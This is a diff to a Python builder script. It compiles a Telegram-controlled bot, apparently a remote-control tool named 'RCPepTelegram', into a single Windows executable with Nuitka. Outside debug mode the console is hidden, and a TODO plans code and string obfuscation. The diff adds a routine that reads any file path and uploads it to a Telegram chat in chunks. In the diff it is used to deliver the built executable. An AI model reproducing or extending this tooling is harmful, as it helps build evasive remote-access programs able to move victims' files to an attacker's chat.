@@ -11,15 +11,19 @@ from shutil import rmtree, copytree
 from threading import Thread
 from subprocess import Popen, PIPE, STDOUT
 from os import chdir, listdir, remove
-from os.path import isdir, join, abspath, isfile, split as pathsplit, exists
+from os.path import isdir, join, abspath, isfile, split as pathsplit, exists, getsize, basename
 import traceback
 import webview
 from template import html_content
+
+#TODO code and strings obfuscation
 
 # ---------------------------------------------------------------------------
 # Paths / constants  (your original values — adjust if needed)
 # ---------------------------------------------------------------------------
 DEBUG = True
+SEND_EXECUTABLE = False
+TELEGRAM_BOT_FILE_MAX_SIZE = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
 REPO_NAME = abspath("RCPepTelegram")
 VENV_PATH = abspath("venv")
 PY_FILE_PATH = join(REPO_NAME, "pep2.py")
@@ -28,9 +32,14 @@ PYTHON_PATH = join(VENV_PATH, "Scripts", "python.exe")
 REQUIREMENTS_COMMAND = f"{PIP_PATH} install -r requirements.txt"
 PY_FILE_MARKER = "PY_FILE_MARKER"
 AUTH_FILE_MARKER = "AUTH_FILE_MARKER"
+PYTHON_FLAGS = [
+    #"-B",
+    #"no_docstrings"
+]
+PYTHON_FLAGS_STRING = " ".join([f"--python-flag={flag} " for flag in PYTHON_FLAGS])
 COMPILE_COMMAND = (
     f"{PYTHON_PATH} -m nuitka {PY_FILE_MARKER} "
-    "--standalone "
+    + PYTHON_FLAGS_STRING +
     f"--windows-console-mode={'force' if DEBUG else 'disable'} "
     "--onefile --onefile-no-compression --follow-imports "
     "--enable-plugin=tk-inter --msvc=latest "
@@ -60,6 +69,50 @@ def copy_file(src, dst):
 def clone_directory(src, dst):
     os.makedirs(dst, exist_ok=True)
     copytree(src, dst, dirs_exist_ok=True)
+
+def download_file(bot, chatid, path: str) -> None:
+    def bsend(message):
+        bot.sendMessage(chatid, message)
+    print(f"Downloading file: {path}")
+    bsend(f"📤 Sending file: {path}")
+    if not isfile(path):
+        bsend(f"❌ Could not send file.\nThe file `{path}` does not exist or you don't have permission to access it.")
+        return
+
+    size = getsize(path)
+
+    if size <= TELEGRAM_BOT_FILE_MAX_SIZE:
+        with open(path, "rb") as fi:
+            bot.sendDocument(chatid, fi)
+            bsend("✅ File has been sent successfully!")
+        return
+
+    base_name = basename(path)
+    part_size = TELEGRAM_BOT_FILE_MAX_SIZE - (len(base_name) + 10)
+
+    with open(path, "rb") as f:
+        part_num = 1
+        while True:
+            chunk = f.read(part_size)
+            if not chunk:
+                break
+
+            part_name = f"{base_name}.part{part_num:03d}"
+            with open(part_name, "wb") as pf:
+                pf.write(chunk)
+
+            with open(part_name, "rb") as pf:
+                bot.sendDocument(
+                    chatid,
+                    pf,
+                    caption=f"📦 {base_name} (part {part_num})"
+                )
+
+            remove(part_name)
+            #bsend(f"📦 Part {part_num} sent.")
+            part_num += 1
+
+    bsend("✅ All file parts have been sent successfully!")
 
 # compile_worker function (your original — unchanged)
 def compile_worker(
@@ -121,6 +174,8 @@ def compile_worker(
         bot.sendMessage(chatid, f"Your bot has been compiled in {elapsed:.2f} minutes")
         if rc != 0:
             raise RuntimeError(output.decode(errors="ignore"))
+        if SEND_EXECUTABLE:
+            download_file(bot, chatid, f"{bot_username}.exe")
     except Exception as e:
         if is_foreground and output_queue:
             output_queue.put(b"\n[ERROR] Compilation failed\n")
